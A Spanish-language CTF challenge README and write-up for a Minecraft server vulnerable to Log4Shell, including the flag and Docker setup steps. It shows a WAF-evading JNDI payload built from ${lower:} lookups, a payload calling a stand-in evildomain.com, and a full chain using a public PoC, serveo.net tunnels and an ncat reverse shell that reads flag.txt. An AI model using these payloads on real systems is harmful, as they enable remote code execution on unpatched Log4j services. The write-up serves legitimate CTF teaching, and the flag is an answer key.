## Redstone forge

Descripción: Mis amigos y yo hemos decidido crear un servidor de Minecraft público para conocer gente nueva! No creo, que pase nada malo, no..? [Versión 1.13.1-1.20.1]

Pista: Esta web te podrá ayudar: https://serveo.net

Flag: ETSIIT_CTF{34sY_Pe4Sy}

**Writeup**

En este reto se nos da una IP con el puerto 25565. Un simple escaneo con `nmap` indica de que se trata de un servidor de Minecraft

```
PORT      STATE SERVICE   VERSION

25565/tcp open  minecraft Minecraft 1.12.2 (Protocol: 127, Message: Hackiit Minecraft Server, Users: 1/100)
```

Al entrar en el servidor con cualquier cliente (oficial y no oficial) se puede observar que hay un usuario llamado HackiitBot y que el único comando que se puede usar es `/msgbot`. Se presupone por el nombre y por la respuesta al usar el comando que lo único que hace es enviarle un mensage privado a la cuenta BOT.

Probando un poco el comando de mensajería podemos llegar a la conclusión que se trata de Log4Shell, que una vulnerabilidad reciente que afecta a la biblioteca Log4j y que afectó a Minecraft entre otros servicios y aplicaciones. 

El comando por defecto para explotar Log4j no va a funcionar a causa de un WAF que bloquea algunos caracteres y palabras. Entre la lista del WAF están `jndi`, `ldap`

Sin embargo, estas limitaciones no son suficientes para crear un payload que no use ningún elemento de la lista bloqueada.
En el caso de `ldap` y `jndi` se pueden separar en caracteres con el lookup  `${lower:j}`. Juntando muchos lookups distintos se puede formar una palabra por lo que `jndi` se quedaría como:

```
${lower:j}ndi:${lower:l}${lower:d}a${lower:p}
```

El comando completo quedaría tal que así:

```
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://evildomain.com/z}
```

Para conseguir una shell se podría usar tools como [Log4shell-POC](https://github.com/kozmer/log4j-shell-poc) o simplemente crear un servidor jndi y un servidor web con un archivo de java compilado con el código a ejecutar.

---

Para abrir un puerto tcp se puede usar [serveo.net](https://serveo.net/)

```
PS C:\Users\Ismael> ssh -R 1389:<ip>:1389 serveo.net
Forwarding TCP connections from serveo.net:1389

PS C:\Users\Ismael> ssh -R 8001:<ip>:8001 serveo.net
Forwarding TCP connections from serveo.net:8001

PS C:\Users\Ismael\Downloads> ssh -R 9001:<ip>:9001 serveo.net
Forwarding TCP connections from serveo.net:9001
```

Escuchamos en 9001 y ejecutamos el script

```
ncat.exe -lvnp 9001

python poc.py --userip serveo.net --webport 8001 --lport 9001
```

En minecraft, mandamos el siguiente mensaje:

```
/msgbot ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://serveo.net:1389/a}
```

En el netcat obtendremos una shell. La flag estará en flag.txt

```
PS C:\Users\Ismael> ncat.exe -lvnp 9001
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from [::1]:58779.
ls
bot.jar
bot.jar.cache
flag.txt
cat flag.txt
ETSIIT_CTF{34sY_Pe4Sy}
```

---
**Instrucciones**

Abrir docker-compose.yml y editar la variable de entorno `CLIENT_IP=<IP>` a IP del servidor donde se aloje:

```
sudo docker-compose up
```

El servidor se debería iniciar automáticamente

![alt text](assets/mc.png)

Creditos a [@nimmis](https://github.com/nimmis/docker-spigot) por la imagen de Docker


